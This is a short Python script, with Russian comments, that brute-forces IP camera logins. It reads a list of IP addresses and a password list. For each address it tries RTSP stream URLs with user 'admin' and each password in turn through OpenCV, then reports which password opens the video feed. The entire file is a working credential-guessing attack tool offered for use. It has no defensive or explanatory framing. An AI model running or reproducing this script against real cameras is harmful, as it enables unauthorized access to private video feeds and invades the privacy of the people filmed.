import cv2
import os

ips_file = "rtsp.txt"
passwords_file = "pas.txt"
username = "admin"

# Проверка файлов
if not os.path.exists(ips_file):
    print(f"[!] Файл '{ips_file}' не найден.")
    exit(1)
if not os.path.exists(passwords_file):
    print(f"[!] Файл '{passwords_file}' не найден.")
    exit(1)

# Чтение IP и паролей
with open(ips_file, "r") as f:
    ips = [line.strip() for line in f if line.strip()]
with open(passwords_file, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

# Перебор IP и паролей
for ip in ips:
    print(f"\n[~] Проверка IP: {ip}")
    for password in passwords:
        rtsp_url = f"rtsp://{ip}/user={username}_password={password}_channel=1_stream=0.sdp?real_stream"
        print(f"   Пробую пароль: {password}")
        cap = cv2.VideoCapture(rtsp_url)

        if cap.isOpened():
            print(f" [+] УСПЕХ! IP: {ip} | Пароль: {password}")
            cap.release()
            break  # переход к следующему IP
        cap.release()
    else:
        print(f" [-] Не удалось найти рабочий пароль для {ip}")
